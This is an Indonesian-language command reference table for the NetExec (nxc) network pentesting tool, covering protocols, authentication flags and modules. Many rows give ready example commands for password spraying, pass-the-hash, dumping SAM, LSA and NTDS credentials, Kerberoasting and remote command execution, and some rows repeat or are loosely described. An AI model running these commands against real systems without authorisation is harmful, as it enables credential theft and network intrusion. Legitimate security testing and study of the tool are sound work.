# netexec

| Command | Deskripsi | Contoh |
|---|---|---|
| `nxc --help` | Menampilkan bantuan umum NetExec/NXC. | `nxc --help` |
| `nxc -h` | Alias untuk menampilkan bantuan umum. | `nxc -h` |
| `nxc --version` | Menampilkan versi NetExec yang terpasang. | `nxc --version` |
| `nxc <protocol> --help` | Menampilkan bantuan khusus protocol tertentu. | `nxc smb --help` |
| `nxc <protocol> <target>` | Sintaks dasar menjalankan NetExec terhadap target. | `nxc smb 192.168.1.10` |
| `nxc smb <target>` | Menggunakan protocol SMB. | `nxc smb 192.168.1.10` |
| `nxc winrm <target>` | Menggunakan protocol WinRM. | `nxc winrm 192.168.1.10` |
| `nxc ldap <target>` | Menggunakan protocol LDAP. | `nxc ldap 192.168.1.10` |
| `nxc mssql <target>` | Menggunakan protocol Microsoft SQL Server. | `nxc mssql 192.168.1.10` |
| `nxc ssh <target>` | Menggunakan protocol SSH. | `nxc ssh 192.168.1.10` |
| `nxc ftp <target>` | Menggunakan protocol FTP. | `nxc ftp 192.168.1.10` |
| `nxc rdp <target>` | Menggunakan protocol RDP. | `nxc rdp 192.168.1.10` |
| `nxc vnc <target>` | Menggunakan protocol VNC. | `nxc vnc 192.168.1.10` |
| `nxc wmi <target>` | Menggunakan Windows Management Instrumentation. | `nxc wmi 192.168.1.10` |
| `nxc nfs <target>` | Menggunakan protocol NFS pada versi yang mendukungnya. | `nxc nfs 192.168.1.10` |
| `nxc rlogin <target>` | Menggunakan protocol Rlogin pada versi yang mendukungnya. | `nxc rlogin 192.168.1.10` |
| `nxc smb <targets>` | Menentukan satu atau beberapa target SMB. | `nxc smb 192.168.1.10 192.168.1.11` |
| `nxc smb <CIDR>` | Memindai target dalam suatu CIDR. | `nxc smb 192.168.1.0/24` |
| `nxc smb <file>` | Menggunakan file berisi daftar target. | `nxc smb targets.txt` |
| `nxc smb <range>` | Menargetkan rentang alamat IP. | `nxc smb 192.168.1.10-20` |
| `-u <username>` | Menentukan username. | `nxc smb 192.168.1.10 -u administrator` |
| `-u <file>` | Membaca daftar username dari file. | `nxc smb 192.168.1.10 -u users.txt` |
| `-p <password>` | Menentukan password. | `nxc smb 192.168.1.10 -u administrator -p 'Password123!'` |
| `-p <file>` | Membaca daftar password dari file. | `nxc smb 192.168.1.10 -u users.txt -p passwords.txt` |
| `-H <hash>` | Menggunakan NTLM hash sebagai kredensial. | `nxc smb 192.168.1.10 -u administrator -H <NTLM_HASH>` |
| `-H <file>` | Membaca daftar NTLM hash dari file. | `nxc smb 192.168.1.10 -u users.txt -H hashes.txt` |
| `--local-auth` | Menggunakan autentikasi akun lokal, bukan domain. | `nxc smb 192.168.1.10 -u administrator -p 'Password123!' --local-auth` |
| `-d <domain>` | Menentukan domain secara eksplisit. | `nxc smb 192.168.1.10 -d CONTOSO -u user -p 'Password123!'` |
| `--domain <domain>` | Bentuk long option untuk menentukan domain. | `nxc smb 192.168.1.10 --domain CONTOSO -u user -p 'Password123!'` |
| `-id <ID>` | Menggunakan credential ID yang tersimpan di database NXC. | `nxc smb 192.168.1.10 -id 3` |
| `--continue-on-success` | Tetap melanjutkan proses setelah menemukan autentikasi berhasil. | `nxc smb 192.168.1.10 -u users.txt -p 'Password123!' --continue-on-success` |
| `--no-bruteforce` | Memasangkan username dan password berdasarkan posisi masing-masing, bukan semua kombinasi. | `nxc smb 192.168.1.10 -u users.txt -p passwords.txt --no-bruteforce` |
| `--jitter <seconds>` | Memberikan jeda acak antar-request autentikasi. | `nxc smb 192.168.1.10 -u users.txt -p passwords.txt --jitter 2-5` |
| `--gfail-limit <n>` | Membatasi jumlah kegagalan autentikasi global sebelum proses dihentikan. | `nxc smb 192.168.1.10 -u users.txt -p passwords.txt --gfail-limit 10` |
| `--ufail-limit <n>` | Membatasi jumlah kegagalan autentikasi per username. | `nxc smb 192.168.1.10 -u users.txt -p passwords.txt --ufail-limit 3` |
| `--fail-limit <n>` | Membatasi jumlah kegagalan autentikasi sesuai mekanisme limit NXC. | `nxc smb 192.168.1.10 -u users.txt -p passwords.txt --fail-limit 10` |
| `--threads <n>` | Menentukan jumlah thread yang digunakan. | `nxc smb 192.168.1.10/24 --threads 50` |
| `--timeout <seconds>` | Menentukan timeout koneksi/request. | `nxc smb 192.168.1.10 --timeout 10` |
| `--verbose` | Menampilkan informasi tambahan selama proses. | `nxc smb 192.168.1.10 --verbose` |
| `-v` | Alias/short option untuk verbose pada versi yang mendukungnya. | `nxc smb 192.168.1.10 -v` |
| `--debug` | Mengaktifkan output debugging. | `nxc smb 192.168.1.10 --debug` |
| `--no-progress` | Menonaktifkan progress display. | `nxc smb 192.168.1.10 --no-progress` |
| `--log <file>` | Menyimpan output ke file log. | `nxc smb 192.168.1.10 --log nxc.log` |
| `--force-ipv6` | Memaksa penggunaan IPv6. | `nxc smb target.example --force-ipv6` |
| `--dns-server <server>` | Menentukan DNS server yang digunakan. | `nxc ldap dc.example.local --dns-server 192.168.1.1` |
| `--dns-tcp` | Menggunakan TCP untuk query DNS. | `nxc ldap dc.example.local --dns-tcp` |
| `--dns-timeout <seconds>` | Menentukan timeout DNS. | `nxc ldap dc.example.local --dns-timeout 5` |
| `--kerberos` | Menggunakan autentikasi Kerberos. | `nxc smb dc.example.local -u user -p 'Password123!' --kerberos` |
| `--use-kcache` | Menggunakan credential/cache Kerberos yang tersedia. | `nxc smb dc.example.local --use-kcache` |
| `--aesKey <key>` | Menggunakan AES key untuk autentikasi Kerberos. | `nxc smb dc.example.local -u user --aesKey <AES_KEY> --kerberos` |
| `--kdcHost <host>` | Menentukan KDC/Domain Controller yang digunakan untuk Kerberos. | `nxc smb dc.example.local --kdcHost dc.example.local --kerberos` |
| `--pfx-cert <file>` | Menggunakan sertifikat PFX untuk metode autentikasi yang mendukungnya. | `nxc ldap dc.example.local --pfx-cert client.pfx` |
| `--pfx-base64 <value>` | Memberikan PFX dalam bentuk Base64. | `nxc ldap dc.example.local --pfx-base64 <BASE64>` |
| `--pfx-pass <password>` | Menentukan password PFX. | `nxc ldap dc.example.local --pfx-cert client.pfx --pfx-pass 'secret'` |
| `--pem-cert <file>` | Menentukan sertifikat PEM. | `nxc ldap dc.example.local --pem-cert cert.pem` |
| `--pem-key <file>` | Menentukan private key PEM. | `nxc ldap dc.example.local --pem-key key.pem` |
| `-M <module>` | Menjalankan module NXC tertentu. | `nxc smb 192.168.1.10 -M <module>` |
| `--module <module>` | Long option untuk menjalankan module. | `nxc smb 192.168.1.10 --module <module>` |
| `-L` | Menampilkan daftar module yang tersedia. | `nxc smb -L` |
| `--list-modules` | Menampilkan daftar module yang tersedia. | `nxc smb --list-modules` |
| `--options` | Menampilkan opsi/module options pada konteks yang didukung. | `nxc smb --options` |
| `--module-options` | Menentukan opsi tambahan untuk module. | `nxc smb 192.168.1.10 -M <module> --module-options OPTION=value` |
| `--show-module-options` | Menampilkan opsi yang tersedia untuk module tertentu. | `nxc smb 192.168.1.10 -M <module> --show-module-options` |
| `-x <command>` | Menjalankan command melalui mekanisme command execution protocol yang mendukungnya. | `nxc smb 192.168.1.10 -u admin -p 'Password123!' -x 'whoami'` |
| `-X <command>` | Menjalankan command melalui PowerShell pada protocol yang mendukungnya. | `nxc smb 192.168.1.10 -u admin -p 'Password123!' -X 'Get-Process'` |
| `--exec-method <method>` | Menentukan metode eksekusi command yang tersedia pada protocol tertentu. | `nxc smb 192.168.1.10 -u admin -p 'Password123!' --exec-method wmiexec` |
| `--sam` | Mengambil SAM database pada target SMB ketika hak akses yang diperlukan tersedia. | `nxc smb 192.168.1.10 -u admin -p 'Password123!' --sam` |
| `--lsa` | Mengambil informasi LSA secrets ketika hak akses yang diperlukan tersedia. | `nxc smb 192.168.1.10 -u admin -p 'Password123!' --lsa` |
| `--ntds` | Mengambil NTDS data dari Domain Controller ketika hak akses yang diperlukan tersedia. | `nxc smb dc.example.local -u admin -p 'Password123!' --ntds` |
| `--shares` | Menampilkan SMB shares yang tersedia. | `nxc smb 192.168.1.10 -u user -p 'Password123!' --shares` |
| `--sessions` | Menampilkan session SMB yang dapat diakses. | `nxc smb 192.168.1.10 -u user -p 'Password123!' --sessions` |
| `--disks` | Menampilkan drive/disk yang dapat diakses melalui SMB. | `nxc smb 192.168.1.10 -u user -p 'Password123!' --disks` |
| `--loggedon-users` | Menampilkan user yang sedang login ketika informasi tersebut dapat diperoleh. | `nxc smb 192.168.1.10 -u admin -p 'Password123!' --loggedon-users` |
| `--users` | Menampilkan daftar user melalui enumerasi SMB/RPC yang didukung. | `nxc smb 192.168.1.10 -u user -p 'Password123!' --users` |
| `--groups` | Menampilkan group yang dapat dienumerasi. | `nxc smb 192.168.1.10 -u user -p 'Password123!' --groups` |
| `--local-groups` | Menampilkan local groups pada target. | `nxc smb 192.168.1.10 -u admin -p 'Password123!' --local-groups` |
| `--pass-pol` | Menampilkan password policy domain/host jika dapat diakses. | `nxc smb 192.168.1.10 -u user -p 'Password123!' --pass-pol` |
| `--rid-brute <max-rid>` | Melakukan RID enumeration sampai batas RID tertentu. | `nxc smb 192.168.1.10 -u user -p 'Password123!' --rid-brute 5000` |
| `--wmi <query>` | Menjalankan WMI query pada target ketika didukung oleh protocol/versi. | `nxc smb 192.168.1.10 -u admin -p 'Password123!' --wmi 'SELECT * FROM Win32_OperatingSystem'` |
| `--spider <share>` | Melakukan spidering terhadap file/directory pada SMB share. | `nxc smb 192.168.1.10 -u user -p 'Password123!' --spider SHARE` |
| `--pattern <pattern>` | Mencari pola tertentu ketika melakukan spidering file. | `nxc smb 192.168.1.10 -u user -p 'Password123!' --spider SHARE --pattern password` |
| `--depth <n>` | Membatasi kedalaman traversal saat spidering. | `nxc smb 192.168.1.10 -u user -p 'Password123!' --spider SHARE --depth 3` |
| `--share <share>` | Menentukan SMB share yang akan digunakan. | `nxc smb 192.168.1.10 -u user -p 'Password123!' --share C$` |
| `--dir <path>` | Menampilkan isi directory pada share yang ditentukan. | `nxc smb 192.168.1.10 -u user -p 'Password123!' --share C$ --dir 'Users'` |
| `--ls` | Menampilkan listing file/directory pada protocol yang mendukung opsi tersebut. | `nxc smb 192.168.1.10 -u user -p 'Password123!' --share C$ --ls` |
| `--get-file <remote> <local>` | Mengambil file dari target ke sistem lokal pada protocol yang mendukungnya. | `nxc smb 192.168.1.10 -u user -p 'Password123!' --get-file 'C:\\Temp\\test.txt' ./test.txt` |
| `--put-file <local> <remote>` | Mengunggah file lokal ke target pada protocol yang mendukungnya. | `nxc smb 192.168.1.10 -u admin -p 'Password123!' --put-file ./test.txt 'C:\\Temp\\test.txt'` |
| `--gen-relay-list <file>` | Membuat daftar target yang dapat digunakan untuk relay berdasarkan kondisi SMB tertentu. | `nxc smb 192.168.1.0/24 --gen-relay-list relay.txt` |
| `--signing` | Memeriksa konfigurasi SMB signing pada target. | `nxc smb 192.168.1.0/24 --signing` |
| `--smb1` | Menguji/menggunakan SMBv1 pada kondisi yang didukung versi NXC. | `nxc smb 192.168.1.10 --smb1` |
| `--shares` | Melakukan enumerasi SMB shares. | `nxc smb 192.168.1.10 --shares` |
| `--sessions` | Melakukan enumerasi session SMB. | `nxc smb 192.168.1.10 --sessions` |
| `--loggedon-users` | Melakukan enumerasi user yang sedang logged-on. | `nxc smb 192.168.1.10 --loggedon-users` |
| `--local-groups` | Melakukan enumerasi local groups. | `nxc smb 192.168.1.10 --local-groups` |
| `--users` | Melakukan enumerasi user SMB/RPC. | `nxc smb 192.168.1.10 --users` |
| `--groups` | Melakukan enumerasi domain groups. | `nxc smb 192.168.1.10 --groups` |
| `--pass-pol` | Melakukan enumerasi password policy. | `nxc smb 192.168.1.10 --pass-pol` |
| `--rid-brute` | Melakukan enumerasi account berdasarkan Windows RID. | `nxc smb 192.168.1.10 --rid-brute` |
| `--gen-relay-list <file>` | Menulis host yang memenuhi kondisi relay tertentu ke file. | `nxc smb 192.168.1.0/24 --gen-relay-list relay.txt` |
| `--laps` | Mengambil informasi Microsoft LAPS ketika akun memiliki hak akses yang diperlukan. | `nxc smb 192.168.1.10 -u admin -p 'Password123!' --laps` |
| `--gmsa` | Mengambil informasi gMSA ketika hak akses yang diperlukan tersedia. | `nxc smb 192.168.1.10 -u admin -p 'Password123!' --gmsa` |
| `--dpapi` | Menggunakan fungsi/modul DPAPI yang tersedia pada versi NXC. | `nxc smb 192.168.1.10 -u admin -p 'Password123!' --dpapi` |
| `--asreproast <file>` | Melakukan enumerasi akun yang dapat digunakan untuk AS-REP roasting dan menyimpan hasil sesuai opsi. | `nxc ldap 192.168.1.10 -u user -p 'Password123!' --asreproast asrep.txt` |
| `--kerberoasting <file>` | Mencari akun dengan SPN yang relevan untuk Kerberoasting dan menyimpan hasil. | `nxc ldap 192.168.1.10 -u user -p 'Password123!' --kerberoasting kerberoast.txt` |
| `--find-delegation` | Mencari konfigurasi delegation pada Active Directory. | `nxc ldap 192.168.1.10 -u user -p 'Password123!' --find-delegation` |
| `--trusted-for-delegation` | Memfilter/mencari computer account yang trusted for delegation. | `nxc ldap 192.168.1.10 -u user -p 'Password123!' --trusted-for-delegation` |
| `--password-not-required` | Mencari akun dengan flag DONT_REQ_PREAUTH/password-not-required yang relevan. | `nxc ldap 192.168.1.10 -u user -p 'Password123!' --password-not-required` |
| `--admin-count` | Mencari object AD dengan atribut AdminCount yang relevan. | `nxc ldap 192.168.1.10 -u user -p 'Password123!' --admin-count` |
| `--active-users` | Menampilkan akun user yang aktif. | `nxc ldap 192.168.1.10 -u user -p 'Password123!' --active-users` |
| `--users` | Mengambil informasi user Active Directory melalui LDAP. | `nxc ldap 192.168.1.10 -u user -p 'Password123!' --users` |
| `--groups` | Mengambil informasi group Active Directory melalui LDAP. | `nxc ldap 192.168.1.10 -u user -p 'Password123!' --groups` |
| `--dc-list` | Menampilkan daftar Domain Controller yang ditemukan melalui LDAP. | `nxc ldap 192.168.1.10 -u user -p 'Password123!' --dc-list` |
| `--get-sid` | Mengambil SID domain/host yang dapat diperoleh melalui LDAP. | `nxc ldap 192.168.1.10 -u user -p 'Password123!' --get-sid` |
| `--base-dn <DN>` | Menentukan Base DN LDAP secara manual. | `nxc ldap 192.168.1.10 -u user -p 'Password123!' --base-dn 'DC=example,DC=local'` |
| `--query <LDAP-filter>` | Menjalankan LDAP query/filter tertentu. | `nxc ldap 192.168.1.10 -u user -p 'Password123!' --query '<LDAP_FILTER>'` |
| `--bloodhound -c <collection>` | Mengumpulkan data Active Directory untuk BloodHound pada versi yang mendukung opsi tersebut. | `nxc ldap 192.168.1.10 -u user -p 'Password123!' --bloodhound -c All` |
| `--port <port>` | Menentukan port protocol secara manual. | `nxc smb 192.168.1.10 --port 445` |
| `--share <share>` | Menentukan share SMB yang digunakan untuk operasi tertentu. | `nxc smb 192.168.1.10 --share IPC$` |
| `--server <address>` | Menentukan server address untuk fungsi protocol/module tertentu. | `nxc smb 192.168.1.10 --server 192.168.1.20` |
| `--server-host <host>` | Menentukan hostname/interface server yang digunakan oleh fungsi tertentu. | `nxc smb 192.168.1.10 --server-host 0.0.0.0` |
| `--server-port <port>` | Menentukan port server untuk fungsi tertentu. | `nxc smb 192.168.1.10 --server-port 445` |
| `--connectback-host <host>` | Menentukan alamat connect-back untuk fitur yang membutuhkannya. | `nxc smb 192.168.1.10 --connectback-host 192.168.1.20` |
| `nxc smb <target> -u <user> -p <pass>` | Menguji autentikasi SMB dengan username/password. | `nxc smb 192.168.1.10 -u user -p 'Password123!'` |
| `nxc winrm <target> -u <user> -p <pass>` | Menguji autentikasi WinRM. | `nxc winrm 192.168.1.10 -u user -p 'Password123!'` |
| `nxc ldap <target> -u <user> -p <pass>` | Menguji autentikasi LDAP. | `nxc ldap 192.168.1.10 -u user -p 'Password123!'` |
| `nxc mssql <target> -u <user> -p <pass>` | Menguji autentikasi MSSQL. | `nxc mssql 192.168.1.10 -u user -p 'Password123!'` |
| `nxc ssh <target> -u <user> -p <pass>` | Menguji autentikasi SSH. | `nxc ssh 192.168.1.10 -u user -p 'Password123!'` |
| `nxc ftp <target> -u <user> -p <pass>` | Menguji autentikasi FTP. | `nxc ftp 192.168.1.10 -u user -p 'Password123!'` |
| `nxc rdp <target> -u <user> -p <pass>` | Menguji autentikasi RDP. | `nxc rdp 192.168.1.10 -u user -p 'Password123!'` |
| `nxc vnc <target> -u <user> -p <pass>` | Menguji autentikasi VNC. | `nxc vnc 192.168.1.10 -u user -p 'Password123!'` |
| `nxc wmi <target> -u <user> -p <pass>` | Menguji autentikasi WMI. | `nxc wmi 192.168.1.10 -u user -p 'Password123!'` |
| `nxc nfs <target> --shares` | Menampilkan export NFS yang dapat ditemukan pada versi yang mendukung opsi tersebut. | `nxc nfs 192.168.1.10 --shares` |
| `nxc nfs <target> --ls <path>` | Melakukan listing directory NFS pada versi yang mendukung opsi tersebut. | `nxc nfs 192.168.1.10 --ls /export` |
| `nxc nfs <target> --get-file <remote> <local>` | Mengambil file melalui NFS. | `nxc nfs 192.168.1.10 --get-file /export/test.txt ./test.txt` |
| `nxc nfs <target> --put-file <local> <remote>` | Mengunggah file melalui NFS pada kondisi yang diizinkan. | `nxc nfs 192.168.1.10 --put-file ./test.txt /export/test.txt` |
| `nxc mssql <target> -q <query>` | Menjalankan SQL query pada MSSQL ketika hak akses mengizinkan. | `nxc mssql 192.168.1.10 -u user -p 'Password123!' -q 'SELECT @@VERSION'` |
| `nxc mssql <target> --local-auth` | Menggunakan autentikasi lokal MSSQL jika tersedia. | `nxc mssql 192.168.1.10 -u sa -p 'Password123!' --local-auth` |
| `nxc mssql <target> --put-file ...` | Menggunakan kemampuan transfer file MSSQL yang tersedia pada versi/module tertentu. | `nxc mssql 192.168.1.10 -u user -p 'Password123!' ...` |
| `nxc ssh <target> -x <command>` | Menjalankan command melalui SSH setelah autentikasi berhasil. | `nxc ssh 192.168.1.10 -u user -p 'Password123!' -x 'id'` |
| `nxc ftp <target> --ls` | Menampilkan isi directory FTP pada versi yang mendukung opsi tersebut. | `nxc ftp 192.168.1.10 -u user -p 'Password123!' --ls` |
| `nxc ftp <target> --get <file>` | Mengambil file melalui FTP pada versi yang mendukung opsi tersebut. | `nxc ftp 192.168.1.10 -u user -p 'Password123!' --get test.txt` |
| `nxc ftp <target> --put <file>` | Mengunggah file melalui FTP pada versi yang mendukung opsi tersebut. | `nxc ftp 192.168.1.10 -u user -p 'Password123!' --put test.txt` |
| `nxc rdp <target> --screenshot` | Mengambil screenshot sesi RDP pada kondisi dan versi yang mendukungnya. | `nxc rdp 192.168.1.10 -u user -p 'Password123!' --screenshot` |
| `nxc winrm <target> -x <command>` | Menjalankan command melalui WinRM setelah autentikasi berhasil. | `nxc winrm 192.168.1.10 -u user -p 'Password123!' -x 'whoami'` |
| `nxc wmi <target> -x <command>` | Menjalankan command melalui WMI setelah autentikasi berhasil. | `nxc wmi 192.168.1.10 -u admin -p 'Password123!' -x 'whoami'` |
| `nxc <protocol> <target> -M <module>` | Menjalankan satu module terhadap target. | `nxc smb 192.168.1.10 -M <module>` |
| `nxc <protocol> <target> -M <module> --options` | Melihat konfigurasi/opsi module pada versi yang mendukungnya. | `nxc smb 192.168.1.10 -M <module> --options` |
| `nxc <protocol> <target> -M <module> --module-options <options>` | Memberikan parameter khusus kepada module. | `nxc smb 192.168.1.10 -M <module> --module-options KEY=value` |
| `nxc <protocol> <target> -M <module1> -M <module2>` | Menjalankan beberapa module pada target apabila didukung versi tersebut. | `nxc smb 192.168.1.10 -M <module1> -M <module2>` |
| `nxc smb <target> --server-host <host> --server-port <port>` | Menentukan endpoint server yang digunakan oleh fitur SMB tertentu. | `nxc smb 192.168.1.10 --server-host 192.168.1.20 --server-port 445` |
| `nxc ldap <target> --server <protocol>` | Menentukan server scheme/parameter LDAP tertentu pada versi yang mendukungnya. | `nxc ldap 192.168.1.10 --server https` |
| `nxc ldap <target> --port 389` | Menggunakan port LDAP standar. | `nxc ldap 192.168.1.10 --port 389` |
| `nxc ldap <target> --port 636` | Menggunakan port LDAPS. | `nxc ldap 192.168.1.10 --port 636` |
| `nxc smb <target> --port 445` | Menggunakan port SMB standar. | `nxc smb 192.168.1.10 --port 445` |
| `nxc winrm <target> --port 5985` | Menggunakan port WinRM HTTP standar. | `nxc winrm 192.168.1.10 --port 5985` |
| `nxc winrm <target> --port 5986` | Menggunakan port WinRM HTTPS standar. | `nxc winrm 192.168.1.10 --port 5986` |
| `nxc ssh <target> --port 22` | Menggunakan port SSH standar. | `nxc ssh 192.168.1.10 --port 22` |
| `nxc ftp <target> --port 21` | Menggunakan port FTP standar. | `nxc ftp 192.168.1.10 --port 21` |
| `nxc rdp <target> --port 3389` | Menggunakan port RDP standar. | `nxc rdp 192.168.1.10 --port 3389` |
| `nxc mssql <target> --port 1433` | Menggunakan port MSSQL standar. | `nxc mssql 192.168.1.10 --port 1433` |
| `nxc vnc <target> --port 5900` | Menggunakan port VNC umum. | `nxc vnc 192.168.1.10 --port 5900` |
| `nxc <protocol> <target> -u <user> -p <pass> --verbose` | Menjalankan autentikasi dengan output lebih detail. | `nxc smb 192.168.1.10 -u user -p 'Password123!' --verbose` |
| `nxc <protocol> <target> --debug` | Menjalankan command dengan debugging aktif. | `nxc smb 192.168.1.10 --debug` |
| `nxc <protocol> <target> --log output.log` | Menyimpan output pemeriksaan ke log. | `nxc smb 192.168.1.10 --log output.log` |
| `nxc <protocol> <target> --threads 20 --timeout 10` | Mengatur concurrency dan timeout koneksi. | `nxc smb 192.168.1.0/24 --threads 20 --timeout 10` |
| `nxc <protocol> <target> -u <user> -p <pass> --local-auth` | Menguji kredensial sebagai akun lokal. | `nxc smb 192.168.1.10 -u administrator -p 'Password123!' --local-auth` |
| `nxc <protocol> <target> -u <user> -H <hash>` | Menggunakan NTLM hash sebagai credential material pada protocol yang mendukungnya. | `nxc smb 192.168.1.10 -u administrator -H <NTLM_HASH>` |
| `nxc <protocol> <target> -u <user> -p <pass> --kerberos` | Menggunakan Kerberos untuk autentikasi. | `nxc smb dc.example.local -u user -p 'Password123!' --kerberos` |
| `nxc <protocol> <target> --use-kcache` | Menggunakan Kerberos credential cache yang tersedia. | `nxc smb dc.example.local --use-kcache` |
| `nxc <protocol> <target> -id <id>` | Menggunakan credential yang tersimpan di database berdasarkan ID. | `nxc smb 192.168.1.10 -id 1` |
| `nxc <protocol> <target> -L` | Menampilkan module yang tersedia untuk protocol tersebut. | `nxc smb -L` |
| `nxc <protocol> <target> -M <module>` | Memanggil module tertentu. | `nxc ldap 192.168.1.10 -M <module>` |
| `nxc --help` | Referensi utama untuk memastikan opsi yang benar-benar tersedia pada versi NXC lokal. | `nxc --help` |
